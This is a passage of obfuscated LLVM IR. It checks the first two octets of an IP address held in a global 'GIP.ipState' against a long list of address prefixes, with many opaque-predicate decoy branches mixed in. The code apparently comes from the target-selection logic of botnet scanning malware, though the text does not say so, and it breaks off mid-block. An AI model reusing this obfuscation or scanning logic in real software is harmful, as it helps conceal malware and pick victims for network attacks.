  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %350
  %359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %360 = zext i8 %359 to i32
  %361 = icmp eq i32 %360, 114
  %362 = load i32, i32* @x.71
  %363 = load i32, i32* @y.72
  %364 = sub i32 %362, 1
  %365 = mul i32 %362, %364
  %366 = urem i32 %365, 2
  %367 = icmp eq i32 %366, 0
  %368 = icmp slt i32 %363, 10
  %369 = or i1 %367, %368
  br i1 %369, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  br i1 %361, label %5042, label %370

; <label>:370:                                    ; preds = %originalBBpart248, %originalBBpart244
  %371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %372 = zext i8 %371 to i32
  %373 = icmp eq i32 %372, 150
  br i1 %373, label %374, label %394

; <label>:374:                                    ; preds = %370
  %375 = load i32, i32* @x.71
  %376 = load i32, i32* @y.72
  %377 = sub i32 %375, 1
  %378 = mul i32 %375, %377
  %379 = urem i32 %378, 2
  %380 = icmp eq i32 %379, 0
  %381 = icmp slt i32 %376, 10
  %382 = or i1 %380, %381
  br i1 %382, label %originalBB50, label %originalBB50alteredBB

originalBB50:                                     ; preds = %originalBB50alteredBB, %374
  %383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %384 = zext i8 %383 to i32
  %385 = icmp eq i32 %384, 125
  %386 = load i32, i32* @x.71
  %387 = load i32, i32* @y.72
  %388 = sub i32 %386, 1
  %389 = mul i32 %386, %388
  %390 = urem i32 %389, 2
  %391 = icmp eq i32 %390, 0
  %392 = icmp slt i32 %387, 10
  %393 = or i1 %391, %392
  br i1 %393, label %originalBBpart252, label %originalBB50alteredBB

originalBBpart252:                                ; preds = %originalBB50
  br i1 %385, label %5042, label %394

; <label>:394:                                    ; preds = %originalBBpart252, %370
  %395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %396 = zext i8 %395 to i32
  %397 = icmp eq i32 %396, 150
  br i1 %397, label %398, label %402

; <label>:398:                                    ; preds = %394
  %399 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %400 = zext i8 %399 to i32
  %401 = icmp eq i32 %400, 133
  br i1 %401, label %5042, label %402

; <label>:402:                                    ; preds = %398, %394
  %403 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %404 = zext i8 %403 to i32
  %405 = icmp eq i32 %404, 150
  br i1 %405, label %406, label %426

; <label>:406:                                    ; preds = %402
  %407 = load i32, i32* @x.71
  %408 = load i32, i32* @y.72
  %409 = sub i32 %407, 1
  %410 = mul i32 %407, %409
  %411 = urem i32 %410, 2
  %412 = icmp eq i32 %411, 0
  %413 = icmp slt i32 %408, 10
  %414 = or i1 %412, %413
  br i1 %414, label %originalBB54, label %originalBB54alteredBB

originalBB54:                                     ; preds = %originalBB54alteredBB, %406
  %415 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %416 = zext i8 %415 to i32
  %417 = icmp eq i32 %416, 144
  %418 = load i32, i32* @x.71
  %419 = load i32, i32* @y.72
  %420 = sub i32 %418, 1
  %421 = mul i32 %418, %420
  %422 = urem i32 %421, 2
  %423 = icmp eq i32 %422, 0
  %424 = icmp slt i32 %419, 10
  %425 = or i1 %423, %424
  br i1 %425, label %originalBBpart256, label %originalBB54alteredBB

originalBBpart256:                                ; preds = %originalBB54
  br i1 %417, label %5042, label %426

; <label>:426:                                    ; preds = %originalBBpart256, %402
  %427 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %428 = zext i8 %427 to i32
  %429 = icmp eq i32 %428, 150
  br i1 %429, label %430, label %434

; <label>:430:                                    ; preds = %426
  %431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %432 = zext i8 %431 to i32
  %433 = icmp eq i32 %432, 149
  br i1 %433, label %5042, label %434

; <label>:434:                                    ; preds = %430, %426
  %435 = load i32, i32* @x.71
  %436 = load i32, i32* @y.72
  %437 = sub i32 %435, 1
  %438 = mul i32 %435, %437
  %439 = urem i32 %438, 2
  %440 = icmp eq i32 %439, 0
  %441 = icmp slt i32 %436, 10
  %442 = or i1 %440, %441
  br i1 %442, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %434
  %443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %444 = zext i8 %443 to i32
  %445 = icmp eq i32 %444, 150
  %446 = load i32, i32* @x.71
  %447 = load i32, i32* @y.72
  %448 = sub i32 %446, 1
  %449 = mul i32 %446, %448
  %450 = urem i32 %449, 2
  %451 = icmp eq i32 %450, 0
  %452 = icmp slt i32 %447, 10
  %453 = or i1 %451, %452
  br i1 %453, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %445, label %454, label %474

; <label>:454:                                    ; preds = %originalBBpart260
  %455 = load i32, i32* @x.71
  %456 = load i32, i32* @y.72
  %457 = sub i32 %455, 1
  %458 = mul i32 %455, %457
  %459 = urem i32 %458, 2
  %460 = icmp eq i32 %459, 0
  %461 = icmp slt i32 %456, 10
  %462 = or i1 %460, %461
  br i1 %462, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %454
  %463 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %464 = zext i8 %463 to i32
  %465 = icmp eq i32 %464, 157
  %466 = load i32, i32* @x.71
  %467 = load i32, i32* @y.72
  %468 = sub i32 %466, 1
  %469 = mul i32 %466, %468
  %470 = urem i32 %469, 2
  %471 = icmp eq i32 %470, 0
  %472 = icmp slt i32 %467, 10
  %473 = or i1 %471, %472
  br i1 %473, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %465, label %5042, label %474

; <label>:474:                                    ; preds = %originalBBpart264, %originalBBpart260
  %475 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %476 = zext i8 %475 to i32
  %477 = icmp eq i32 %476, 150
  br i1 %477, label %478, label %482

; <label>:478:                                    ; preds = %474
  %479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %480 = zext i8 %479 to i32
  %481 = icmp eq i32 %480, 184
  br i1 %481, label %5042, label %482

; <label>:482:                                    ; preds = %478, %474
  %483 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %484 = zext i8 %483 to i32
  %485 = icmp eq i32 %484, 150
  br i1 %485, label %486, label %490

; <label>:486:                                    ; preds = %482
  %487 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %488 = zext i8 %487 to i32
  %489 = icmp eq i32 %488, 190
  br i1 %489, label %5042, label %490

; <label>:490:                                    ; preds = %486, %482
  %491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %492 = zext i8 %491 to i32
  %493 = icmp eq i32 %492, 150
  br i1 %493, label %494, label %498

; <label>:494:                                    ; preds = %490
  %495 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %496 = zext i8 %495 to i32
  %497 = icmp eq i32 %496, 196
  br i1 %497, label %5042, label %498

; <label>:498:                                    ; preds = %494, %490
  %499 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %500 = zext i8 %499 to i32
  %501 = icmp eq i32 %500, 152
  br i1 %501, label %502, label %506

; <label>:502:                                    ; preds = %498
  %503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %504 = zext i8 %503 to i32
  %505 = icmp eq i32 %504, 82
  br i1 %505, label %5042, label %506

; <label>:506:                                    ; preds = %502, %498
  %507 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %508 = zext i8 %507 to i32
  %509 = icmp eq i32 %508, 152
  br i1 %509, label %510, label %530

; <label>:510:                                    ; preds = %506
  %511 = load i32, i32* @x.71
  %512 = load i32, i32* @y.72
  %513 = sub i32 %511, 1
  %514 = mul i32 %511, %513
  %515 = urem i32 %514, 2
  %516 = icmp eq i32 %515, 0
  %517 = icmp slt i32 %512, 10
  %518 = or i1 %516, %517
  br i1 %518, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %510
  %519 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %520 = zext i8 %519 to i32
  %521 = icmp eq i32 %520, 229
  %522 = load i32, i32* @x.71
  %523 = load i32, i32* @y.72
  %524 = sub i32 %522, 1
  %525 = mul i32 %522, %524
  %526 = urem i32 %525, 2
  %527 = icmp eq i32 %526, 0
  %528 = icmp slt i32 %523, 10
  %529 = or i1 %527, %528
  br i1 %529, label %originalBBpart268, label %originalBB66alteredBB

originalBBpart268:                                ; preds = %originalBB66
  br i1 %521, label %5042, label %530

; <label>:530:                                    ; preds = %originalBBpart268, %506
  %531 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %532 = zext i8 %531 to i32
  %533 = icmp eq i32 %532, 157
  br i1 %533, label %534, label %538

; <label>:534:                                    ; preds = %530
  %535 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %536 = zext i8 %535 to i32
  %537 = icmp eq i32 %536, 202
  br i1 %537, label %5042, label %538

; <label>:538:                                    ; preds = %534, %530
  %539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %540 = zext i8 %539 to i32
  %541 = icmp eq i32 %540, 157
  br i1 %541, label %542, label %546

; <label>:542:                                    ; preds = %538
  %543 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %544 = zext i8 %543 to i32
  %545 = icmp eq i32 %544, 217
  br i1 %545, label %5042, label %546

; <label>:546:                                    ; preds = %542, %538
  %547 = load i32, i32* @x.71
  %548 = load i32, i32* @y.72
  %549 = sub i32 %547, 1
  %550 = mul i32 %547, %549
  %551 = urem i32 %550, 2
  %552 = icmp eq i32 %551, 0
  %553 = icmp slt i32 %548, 10
  %554 = or i1 %552, %553
  br i1 %554, label %originalBB70, label %originalBB70alteredBB

originalBB70:                                     ; preds = %originalBB70alteredBB, %546
  %555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %556 = zext i8 %555 to i32
  %557 = icmp eq i32 %556, 161
  %558 = load i32, i32* @x.71
  %559 = load i32, i32* @y.72
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBBpart272, label %originalBB70alteredBB

originalBBpart272:                                ; preds = %originalBB70
  br i1 %557, label %566, label %570

; <label>:566:                                    ; preds = %originalBBpart272
  %567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %568 = zext i8 %567 to i32
  %569 = icmp eq i32 %568, 124
  br i1 %569, label %5042, label %570

; <label>:570:                                    ; preds = %566, %originalBBpart272
  %571 = load i32, i32* @x.71
  %572 = load i32, i32* @y.72
  %573 = sub i32 %571, 1
  %574 = mul i32 %571, %573
  %575 = urem i32 %574, 2
  %576 = icmp eq i32 %575, 0
  %577 = icmp slt i32 %572, 10
  %578 = or i1 %576, %577
  br i1 %578, label %originalBB74, label %originalBB74alteredBB

originalBB74:                                     ; preds = %originalBB74alteredBB, %570
  %579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %580 = zext i8 %579 to i32
  %581 = icmp eq i32 %580, 162
  %582 = load i32, i32* @x.71
  %583 = load i32, i32* @y.72
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBBpart276, label %originalBB74alteredBB

originalBBpart276:                                ; preds = %originalBB74
  br i1 %581, label %590, label %594

; <label>:590:                                    ; preds = %originalBBpart276
  %591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %592 = zext i8 %591 to i32
  %593 = icmp eq i32 %592, 32
  br i1 %593, label %5042, label %594

; <label>:594:                                    ; preds = %590, %originalBBpart276
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp eq i32 %596, 155
  br i1 %597, label %598, label %618

; <label>:598:                                    ; preds = %594
  %599 = load i32, i32* @x.71
  %600 = load i32, i32* @y.72
  %601 = sub i32 %599, 1
  %602 = mul i32 %599, %601
  %603 = urem i32 %602, 2
  %604 = icmp eq i32 %603, 0
  %605 = icmp slt i32 %600, 10
  %606 = or i1 %604, %605
  br i1 %606, label %originalBB78, label %originalBB78alteredBB

originalBB78:                                     ; preds = %originalBB78alteredBB, %598
  %607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %608 = zext i8 %607 to i32
  %609 = icmp eq i32 %608, 96
  %610 = load i32, i32* @x.71
  %611 = load i32, i32* @y.72
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBBpart280, label %originalBB78alteredBB

originalBBpart280:                                ; preds = %originalBB78
  br i1 %609, label %5042, label %618

; <label>:618:                                    ; preds = %originalBBpart280, %594
  %619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %620 = zext i8 %619 to i32
  %621 = icmp eq i32 %620, 155
  br i1 %621, label %622, label %626

; <label>:622:                                    ; preds = %618
  %623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %624 = zext i8 %623 to i32
  %625 = icmp eq i32 %624, 149
  br i1 %625, label %5042, label %626

; <label>:626:                                    ; preds = %622, %618
  %627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %628 = zext i8 %627 to i32
  %629 = icmp eq i32 %628, 155
  br i1 %629, label %630, label %634

; <label>:630:                                    ; preds = %626
  %631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %632 = zext i8 %631 to i32
  %633 = icmp eq i32 %632, 155
  br i1 %633, label %5042, label %634

; <label>:634:                                    ; preds = %630, %626
  %635 = load i32, i32* @x.71
  %636 = load i32, i32* @y.72
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBB82, label %originalBB82alteredBB

originalBB82:                                     ; preds = %originalBB82alteredBB, %634
  %643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %644 = zext i8 %643 to i32
  %645 = icmp eq i32 %644, 155
  %646 = load i32, i32* @x.71
  %647 = load i32, i32* @y.72
  %648 = sub i32 %646, 1
  %649 = mul i32 %646, %648
  %650 = urem i32 %649, 2
  %651 = icmp eq i32 %650, 0
  %652 = icmp slt i32 %647, 10
  %653 = or i1 %651, %652
  br i1 %653, label %originalBBpart284, label %originalBB82alteredBB

originalBBpart284:                                ; preds = %originalBB82
  br i1 %645, label %654, label %658

; <label>:654:                                    ; preds = %originalBBpart284
  %655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %656 = zext i8 %655 to i32
  %657 = icmp eq i32 %656, 178
  br i1 %657, label %5042, label %658

; <label>:658:                                    ; preds = %654, %originalBBpart284
  %659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %660 = zext i8 %659 to i32
  %661 = icmp eq i32 %660, 164
  br i1 %661, label %662, label %682

; <label>:662:                                    ; preds = %658
  %663 = load i32, i32* @x.71
  %664 = load i32, i32* @y.72
  %665 = sub i32 %663, 1
  %666 = mul i32 %663, %665
  %667 = urem i32 %666, 2
  %668 = icmp eq i32 %667, 0
  %669 = icmp slt i32 %664, 10
  %670 = or i1 %668, %669
  br i1 %670, label %originalBB86, label %originalBB86alteredBB

originalBB86:                                     ; preds = %originalBB86alteredBB, %662
  %671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %672 = zext i8 %671 to i32
  %673 = icmp eq i32 %672, 158
  %674 = load i32, i32* @x.71
  %675 = load i32, i32* @y.72
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBBpart288, label %originalBB86alteredBB

originalBBpart288:                                ; preds = %originalBB86
  br i1 %673, label %5042, label %682

; <label>:682:                                    ; preds = %originalBBpart288, %658
  %683 = load i32, i32* @x.71
  %684 = load i32, i32* @y.72
  %685 = sub i32 %683, 1
  %686 = mul i32 %683, %685
  %687 = urem i32 %686, 2
  %688 = icmp eq i32 %687, 0
  %689 = icmp slt i32 %684, 10
  %690 = or i1 %688, %689
  br i1 %690, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %682
  %691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %692 = zext i8 %691 to i32
  %693 = icmp eq i32 %692, 156
  %694 = load i32, i32* @x.71
  %695 = load i32, i32* @y.72
  %696 = sub i32 %694, 1
  %697 = mul i32 %694, %696
  %698 = urem i32 %697, 2
  %699 = icmp eq i32 %698, 0
  %700 = icmp slt i32 %695, 10
  %701 = or i1 %699, %700
  br i1 %701, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br i1 %693, label %702, label %706

; <label>:702:                                    ; preds = %originalBBpart292
  %703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %704 = zext i8 %703 to i32
  %705 = icmp eq i32 %704, 9
  br i1 %705, label %5042, label %706

; <label>:706:                                    ; preds = %702, %originalBBpart292
  %707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %708 = zext i8 %707 to i32
  %709 = icmp eq i32 %708, 167
  br i1 %709, label %710, label %730

; <label>:710:                                    ; preds = %706
  %711 = load i32, i32* @x.71
  %712 = load i32, i32* @y.72
  %713 = sub i32 %711, 1
  %714 = mul i32 %711, %713
  %715 = urem i32 %714, 2
  %716 = icmp eq i32 %715, 0
  %717 = icmp slt i32 %712, 10
  %718 = or i1 %716, %717
  br i1 %718, label %originalBB94, label %originalBB94alteredBB

originalBB94:                                     ; preds = %originalBB94alteredBB, %710
  %719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %720 = zext i8 %719 to i32
  %721 = icmp eq i32 %720, 44
  %722 = load i32, i32* @x.71
  %723 = load i32, i32* @y.72
  %724 = sub i32 %722, 1
  %725 = mul i32 %722, %724
  %726 = urem i32 %725, 2
  %727 = icmp eq i32 %726, 0
  %728 = icmp slt i32 %723, 10
  %729 = or i1 %727, %728
  br i1 %729, label %originalBBpart296, label %originalBB94alteredBB

originalBBpart296:                                ; preds = %originalBB94
  br i1 %721, label %5042, label %730

; <label>:730:                                    ; preds = %originalBBpart296, %706
  %731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %732 = zext i8 %731 to i32
  %733 = icmp eq i32 %732, 168
  br i1 %733, label %734, label %738

; <label>:734:                                    ; preds = %730
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 68
  br i1 %737, label %5042, label %738

; <label>:738:                                    ; preds = %734, %730
  %739 = load i32, i32* @x.71
  %740 = load i32, i32* @y.72
  %741 = sub i32 %739, 1
  %742 = mul i32 %739, %741
  %743 = urem i32 %742, 2
  %744 = icmp eq i32 %743, 0
  %745 = icmp slt i32 %740, 10
  %746 = or i1 %744, %745
  br i1 %746, label %originalBB98, label %originalBB98alteredBB

originalBB98:                                     ; preds = %originalBB98alteredBB, %738
  %747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %748 = zext i8 %747 to i32
  %749 = icmp eq i32 %748, 168
  %750 = load i32, i32* @x.71
  %751 = load i32, i32* @y.72
  %752 = sub i32 %750, 1
  %753 = mul i32 %750, %752
  %754 = urem i32 %753, 2
  %755 = icmp eq i32 %754, 0
  %756 = icmp slt i32 %751, 10
  %757 = or i1 %755, %756
  br i1 %757, label %originalBBpart2100, label %originalBB98alteredBB

originalBBpart2100:                               ; preds = %originalBB98
  br i1 %749, label %758, label %762

; <label>:758:                                    ; preds = %originalBBpart2100
  %759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 85
  br i1 %761, label %5042, label %762

; <label>:762:                                    ; preds = %758, %originalBBpart2100
  %763 = load i32, i32* @x.71
  %764 = load i32, i32* @y.72
  %765 = sub i32 %763, 1
  %766 = mul i32 %763, %765
  %767 = urem i32 %766, 2
  %768 = icmp eq i32 %767, 0
  %769 = icmp slt i32 %764, 10
  %770 = or i1 %768, %769
  br i1 %770, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %762
  %771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %772 = zext i8 %771 to i32
  %773 = icmp eq i32 %772, 168
  %774 = load i32, i32* @x.71
  %775 = load i32, i32* @y.72
  %776 = sub i32 %774, 1
  %777 = mul i32 %774, %776
  %778 = urem i32 %777, 2
  %779 = icmp eq i32 %778, 0
  %780 = icmp slt i32 %775, 10
  %781 = or i1 %779, %780
  br i1 %781, label %originalBBpart2104, label %originalBB102alteredBB

originalBBpart2104:                               ; preds = %originalBB102
  br i1 %773, label %782, label %786

; <label>:782:                                    ; preds = %originalBBpart2104
  %783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %784 = zext i8 %783 to i32
  %785 = icmp eq i32 %784, 102
  br i1 %785, label %5042, label %786

; <label>:786:                                    ; preds = %782, %originalBBpart2104
  %787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %788 = zext i8 %787 to i32
  %789 = icmp eq i32 %788, 203
  br i1 %789, label %790, label %810

; <label>:790:                                    ; preds = %786
  %791 = load i32, i32* @x.71
  %792 = load i32, i32* @y.72
  %793 = sub i32 %791, 1
  %794 = mul i32 %791, %793
  %795 = urem i32 %794, 2
  %796 = icmp eq i32 %795, 0
  %797 = icmp slt i32 %792, 10
  %798 = or i1 %796, %797
  br i1 %798, label %originalBB106, label %originalBB106alteredBB

originalBB106:                                    ; preds = %originalBB106alteredBB, %790
  %799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %800 = zext i8 %799 to i32
  %801 = icmp eq i32 %800, 59
  %802 = load i32, i32* @x.71
  %803 = load i32, i32* @y.72
  %804 = sub i32 %802, 1
  %805 = mul i32 %802, %804
  %806 = urem i32 %805, 2
  %807 = icmp eq i32 %806, 0
  %808 = icmp slt i32 %803, 10
  %809 = or i1 %807, %808
  br i1 %809, label %originalBBpart2108, label %originalBB106alteredBB

originalBBpart2108:                               ; preds = %originalBB106
  br i1 %801, label %5042, label %810

; <label>:810:                                    ; preds = %originalBBpart2108, %786
  %811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %812 = zext i8 %811 to i32
  %813 = icmp eq i32 %812, 204
  br i1 %813, label %814, label %818

; <label>:814:                                    ; preds = %810
  %815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %816 = zext i8 %815 to i32
  %817 = icmp eq i32 %816, 34
  br i1 %817, label %5042, label %818

; <label>:818:                                    ; preds = %814, %810
  %819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %820 = zext i8 %819 to i32
  %821 = icmp eq i32 %820, 207
  br i1 %821, label %822, label %842

; <label>:822:                                    ; preds = %818
  %823 = load i32, i32* @x.71
  %824 = load i32, i32* @y.72
  %825 = sub i32 %823, 1
  %826 = mul i32 %823, %825
  %827 = urem i32 %826, 2
  %828 = icmp eq i32 %827, 0
  %829 = icmp slt i32 %824, 10
  %830 = or i1 %828, %829
  br i1 %830, label %originalBB110, label %originalBB110alteredBB

originalBB110:                                    ; preds = %originalBB110alteredBB, %822
  %831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %832 = zext i8 %831 to i32
  %833 = icmp eq i32 %832, 30
  %834 = load i32, i32* @x.71
  %835 = load i32, i32* @y.72
  %836 = sub i32 %834, 1
  %837 = mul i32 %834, %836
  %838 = urem i32 %837, 2
  %839 = icmp eq i32 %838, 0
  %840 = icmp slt i32 %835, 10
  %841 = or i1 %839, %840
  br i1 %841, label %originalBBpart2112, label %originalBB110alteredBB

originalBBpart2112:                               ; preds = %originalBB110
  br i1 %833, label %5042, label %842

; <label>:842:                                    ; preds = %originalBBpart2112, %818
  %843 = load i32, i32* @x.71
  %844 = load i32, i32* @y.72
  %845 = sub i32 %843, 1
  %846 = mul i32 %843, %845
  %847 = urem i32 %846, 2
  %848 = icmp eq i32 %847, 0
  %849 = icmp slt i32 %844, 10
  %850 = or i1 %848, %849
  br i1 %850, label %originalBB114, label %originalBB114alteredBB

originalBB114:                                    ; preds = %originalBB114alteredBB, %842
  %851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %852 = zext i8 %851 to i32
  %853 = icmp eq i32 %852, 117
  %854 = load i32, i32* @x.71
  %855 = load i32, i32* @y.72
  %856 = sub i32 %854, 1
  %857 = mul i32 %854, %856
  %858 = urem i32 %857, 2
  %859 = icmp eq i32 %858, 0
  %860 = icmp slt i32 %855, 10
  %861 = or i1 %859, %860
  br i1 %861, label %originalBBpart2116, label %originalBB114alteredBB

originalBBpart2116:                               ; preds = %originalBB114
  br i1 %853, label %862, label %866

; <label>:862:                                    ; preds = %originalBBpart2116
  %863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %864 = zext i8 %863 to i32
  %865 = icmp eq i32 %864, 55
  br i1 %865, label %5042, label %866

; <label>:866:                                    ; preds = %862, %originalBBpart2116
  %867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %868 = zext i8 %867 to i32
  %869 = icmp eq i32 %868, 117
  br i1 %869, label %870, label %874

; <label>:870:                                    ; preds = %866
  %871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %872 = zext i8 %871 to i32
  %873 = icmp eq i32 %872, 56
  br i1 %873, label %5042, label %874

; <label>:874:                                    ; preds = %870, %866
  %875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %876 = zext i8 %875 to i32
  %877 = icmp eq i32 %876, 80
  br i1 %877, label %878, label %882

; <label>:878:                                    ; preds = %874
  %879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %880 = zext i8 %879 to i32
  %881 = icmp eq i32 %880, 235
